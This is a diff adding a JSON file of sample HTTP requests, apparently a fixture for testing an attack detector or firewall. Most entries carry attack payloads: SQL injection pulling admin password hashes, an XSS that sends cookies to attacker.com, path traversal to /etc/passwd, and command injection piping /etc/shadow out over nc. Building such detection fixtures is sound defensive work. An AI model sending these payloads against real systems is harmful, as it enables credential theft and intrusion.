@@ -1,0 +1,80 @@
+[
+  {
+    "id": "REQ-001",
+    "method": "GET",
+    "path": "/api/v1/users",
+    "query": "page=1&limit=20&sort=asc",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+      "Accept": "application/json",
+      "Host": "api.sqrock-enterprise.internal"
+    },
+    "body": "",
+    "client_ip": "192.168.1.105"
+  },
+  {
+    "id": "REQ-002",
+    "method": "GET",
+    "path": "/products/details",
+    "query": "id=105' UNION SELECT username, password_hash FROM admin_users--",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+      "Accept": "text/html",
+      "Host": "shop.sqrock-enterprise.internal"
+    },
+    "body": "",
+    "client_ip": "198.51.100.44"
+  },
+  {
+    "id": "REQ-003",
+    "method": "POST",
+    "path": "/feedback/submit",
+    "query": "",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
+      "Content-Type": "application/x-www-form-urlencoded",
+      "Host": "sqrock-enterprise.internal"
+    },
+    "body": "comment=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>&rating=5",
+    "client_ip": "203.0.113.89"
+  },
+  {
+    "id": "REQ-004",
+    "method": "GET",
+    "path": "/download/view_receipt",
+    "query": "doc=../../../../etc/passwd",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+      "Accept": "*/*",
+      "Host": "portal.sqrock-enterprise.internal"
+    },
+    "body": "",
+    "client_ip": "185.220.101.5"
+  },
+  {
+    "id": "REQ-005",
+    "method": "POST",
+    "path": "/admin/system_ping",
+    "query": "",
+    "headers": {
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+      "Content-Type": "application/json",
+      "Host": "mgmt.sqrock-enterprise.internal"
+    },
+    "body": "{\"target\": \"8.8.8.8; cat /etc/shadow | nc 198.51.100.99 4444\"}",
+    "client_ip": "45.154.255.12"
+  },
+  {
+    "id": "REQ-006",
+    "method": "GET",
+    "path": "/login",
+    "query": "user=admin",
+    "headers": {
+      "User-Agent": "sqlmap/1.7.2#stable (https://sqlmap.org)",
+      "Accept": "*/*",
+      "Host": "auth.sqrock-enterprise.internal"
+    },
+    "body": "",
+    "client_ip": "91.240.118.17"
+  }
+]
